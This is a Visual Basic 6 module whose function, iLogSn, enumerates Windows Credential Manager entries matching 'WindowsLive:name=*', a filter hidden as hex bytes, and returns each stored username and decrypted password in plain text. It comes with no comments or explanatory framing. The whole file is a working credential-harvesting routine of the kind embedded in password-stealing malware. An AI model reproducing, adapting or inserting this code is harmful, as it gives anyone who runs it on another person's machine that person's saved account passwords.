Attribute VB_Name = "SaveSn"
Option Explicit

Private Declare Function LocalFree Lib "kernel32.dll" (ByVal hMem As Long) As Long
Private Declare Function LocalAlloc Lib "kernel32.dll" (ByVal wFlags As Long, ByVal wBytes As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32.dll" Alias "RtlMoveMemory" (ByRef Destination As Any, ByRef Source As Any, ByVal Length As Long)
Private Declare Function CredEnumerate Lib "advapi32.dll" Alias "CredEnumerateW" (ByVal lpszFilter As Long, ByVal lFlags As Long, ByRef pCount As Long, ByRef lppCredentials As Long) As Long
Private Declare Function CredFree Lib "advapi32.dll" (ByVal pBuffer As Long) As Long
Private Declare Function CryptUnprotectData Lib "crypt32.dll" (ByRef pDataIn As DATA_BLOB, ByVal ppszDataDescr As Long, ByVal pOptionalEntropy As Long, ByVal pvReserved As Long, ByVal pPromptStruct As Long, ByVal dwFlags As Long, ByRef pDataOut As DATA_BLOB) As Long
Private Declare Function SysAllocString Lib "oleaut32.dll" (ByVal pOlechar As Long) As String
Private Declare Function GetVersionEx Lib "kernel32.dll" Alias "GetVersionExA" (ByRef lpVersionInformation As OSVERSIONINFO) As Long

Private Type CREDENTIAL
    dwFlags                 As Long
    dwType                  As Long
    lpstrTargetName         As Long
    lpstrComment            As Long
    ftLastWritten           As Double
    dwCredentialBlobSize    As Long
    lpbCredentialBlob       As Long
    dwPersist               As Long
    dwAttributeCount        As Long
    lpAttributes            As Long
    lpstrTargetAlias        As Long
    lpUserName              As Long
End Type

Private Type DATA_BLOB
    cbData                  As Long
    pbData                  As Long
End Type

Private Type OSVERSIONINFO
    dwOSVersionInfoSize     As Long
    dwMajorVersion          As Long
    dwMinorVersion          As Long
    dwBuildNumber           As Long
    dwPlatformId            As Long
    szCSDVersion            As String * 128
End Type

Public Function iLogSn() As String
    Dim lMem        As Long
    Dim i           As Long
    Dim lCount      As Long
    Dim lCred       As Long
    Dim ub          As Long
    Dim lPtr        As Long
    Dim tCred       As CREDENTIAL
    Dim tBlobOut    As DATA_BLOB
    Dim tBlobIn     As DATA_BLOB
    Dim sPass       As String
    Dim vData       As Variant
    Dim tOSV        As OSVERSIONINFO
    
    With tOSV
        .dwOSVersionInfoSize = Len(tOSV)
        Call GetVersionEx(tOSV)
        If Not .dwMajorVersion + .dwMinorVersion / 10 >= 5.1 Then
            Exit Function
        End If
    End With
    
    lMem = LocalAlloc(&H40, 38)
    
    vData = Array( _
       &H57, &H69, &H6E, &H64, &H6F, &H77, &H73, &H4C, &H69, _
       &H76, &H65, &H3A, &H6E, &H61, &H6D, &H65, &H3D, &H2A)
    
    For i = 0 To 17
        Call CopyMemory(ByVal lMem + (i * 2), CLng(vData(i)), &H1)
    Next
    
    Call CredEnumerate(lMem, 0, lCount, lCred)
    
    If lCount Then
        For i = ub To ub + lCount - 1
        
            Call CopyMemory(ByVal VarPtr(lPtr), ByVal lCred + (i - ub) * 4, &H4)
            Call CopyMemory(ByVal VarPtr(tCred), ByVal lPtr, &H34)
    
            With tBlobIn
                .pbData = tCred.lpbCredentialBlob
                .cbData = tCred.dwCredentialBlobSize
            
                Call CryptUnprotectData(tBlobIn, 0&, 0&, 0&, 0&, 1&, tBlobOut)

                sPass = Space(.cbData \ 2)
                Call CopyMemory(ByVal StrPtr(sPass), ByVal .pbData, .cbData)
            End With
            

            iLogSn = iLogSn & "Username: " & StrConv(SysAllocString(tCred.lpUserName), vbFromUnicode) & vbCrLf
            iLogSn = iLogSn & "Password: " & sPass & vbCrLf

         
        Next
        ub = ub + lCount
    End If
    
    Call CredFree(lCred)
    Call LocalFree(lMem)
End Function

